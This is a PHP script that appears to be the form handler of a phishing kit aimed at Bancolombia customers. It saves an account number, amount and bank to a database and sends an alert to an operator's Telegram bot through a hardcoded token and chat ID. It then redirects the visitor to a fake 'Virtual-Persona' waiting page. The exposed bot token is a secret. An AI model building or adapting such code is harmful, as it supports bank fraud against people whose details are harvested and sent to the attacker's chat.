<?php
session_start();
require 'conexion.php'; // tu archivo de conexión con $pdo listo

// 1. Recibir datos del formulario
$celular =  'No hay celular';
$monto   = 'No hay monto';
$banco   =  'BANCOLOMBIA';

// 2. Generar identificadores
$request_id = uniqid("req_");
$key = bin2hex(random_bytes(16)); // 32 caracteres aleatorios

// 3. Guardar en BD
$stmt = $pdo->prepare("INSERT INTO solicitudes (numero_cuenta, monto, banco, request_id, `key`) VALUES (?, ?, ?, ?, ?)");
$stmt->execute([$celular, $monto,  $banco, $request_id, $key]);

// 4. Enviar a Telegram
$token = "7617726809:AAHd16JUqx-m01rHFilp6BcOsCp4iXD1L-U";
$chat_id = "-4801629674";

$mensaje  = "📥 Nueva Ingreso Verde:\n";

$mensaje .= "🏦 Banco: $banco\n";



file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
  'chat_id' => $chat_id,
  'text' => $mensaje
]));

// 5. Guardar sesión
$_SESSION['celular']   = $celular;
$_SESSION['monto']     = $monto;
$_SESSION['tipo']      = $tipo;
$_SESSION['banco']     = $banco;
$_SESSION['request_id']= $request_id;
$_SESSION['key']       = $key;

// 6. Redirigir a pantalla de espera
header("Location: Virtual-Persona.html?rid=$request_id&key=$key&banco=$banco");
exit;